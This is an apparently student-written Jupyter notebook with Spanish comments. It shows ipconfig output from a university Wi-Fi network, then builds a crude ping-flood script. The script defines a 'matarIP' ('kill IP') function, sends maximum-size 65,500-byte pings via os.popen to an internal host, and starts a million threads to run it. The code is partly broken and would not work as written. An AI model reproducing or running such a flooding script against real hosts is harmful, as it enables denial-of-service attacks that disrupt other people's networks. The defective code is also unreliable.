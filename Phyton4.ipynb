{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "08541990-954b-466d-bdb6-e69999cc4e60",
   "metadata": {},
   "source": [
    "## PYTHON PROGRAM 4"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80435d49-3a90-43b4-b3cc-3c446c20b276",
   "metadata": {},
   "source": [
    "## ipconfig _WINDOWS_"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ea83f42d-598b-4f4e-b65d-826205a40e7e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# La ! es para accedeer a archivos del sistema"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "7a17fccf-8073-41b5-a570-850c7c77097c",
   "metadata": {
    "collapsed": true,
    "jupyter": {
     "outputs_hidden": true
    },
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Configuraci¢n IP de Windows\n",
      "\n",
      "\n",
      "Adaptador de LAN inal mbrica Conexi¢n de  rea local* 1:\n",
      "\n",
      "   Estado de los medios. . . . . . . . . . . : medios desconectados\n",
      "   Sufijo DNS espec¡fico para la conexi¢n. . : \n",
      "\n",
      "Adaptador de LAN inal mbrica Conexi¢n de  rea local* 2:\n",
      "\n",
      "   Estado de los medios. . . . . . . . . . . : medios desconectados\n",
      "   Sufijo DNS espec¡fico para la conexi¢n. . : \n",
      "\n",
      "Adaptador de LAN inal mbrica Wi-Fi:\n",
      "\n",
      "   Sufijo DNS espec¡fico para la conexi¢n. . : alumnos.uem.es\n",
      "   V¡nculo: direcci¢n IPv6 local. . . : fe80::bd77:d2ac:e095:fb9b%15\n",
      "   Direcci¢n IPv4. . . . . . . . . . . . . . : 10.34.85.100\n",
      "   M scara de subred . . . . . . . . . . . . : 255.255.248.0\n",
      "   Puerta de enlace predeterminada . . . . . : 10.34.80.1\n",
      "\n",
      "Adaptador de Ethernet Conexi¢n de red Bluetooth:\n",
      "\n",
      "   Estado de los medios. . . . . . . . . . . : medios desconectados\n",
      "   Sufijo DNS espec¡fico para la conexi¢n. . : \n"
     ]
    }
   ],
   "source": [
    "! ipconfig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "e1752d53-5e32-4520-9922-bdc009967e47",
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading, os, platform, requests, json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "8e603fee-2530-4222-99e6-7cc5ec4a9005",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matarIP():\n",
    "    res_\n",
    "    threading.currentThread().getName()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "2e64ff66-1b17-442b-b7a5-b6ccf9a4fc2f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'MainThread'"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "threading.currentThread().getName()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "62445ff4-2824-486a-a99d-c1ae6804c651",
   "metadata": {},
   "outputs": [],
   "source": [
    "res_=os.popen(\"ping <10.34.20.81> -l 65500 -w 1 -n 1\") "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "ab505b8e-4a1f-4c58-babe-63ddece584cb",
   "metadata": {},
   "outputs": [],
   "source": [
    "matarIP()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "0f689f8a-7043-4b9f-89ed-bb354e29ae2f",
   "metadata": {},
   "outputs": [],
   "source": [
    "matarnum = 1_000_000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b45e033c-1eba-4753-a561-db5efa2e4cab",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(matarnum):\n",
    "    threading.Thread(target=matarIP).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0bc9153d-beed-4859-95b9-e6a24bdd5e84",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
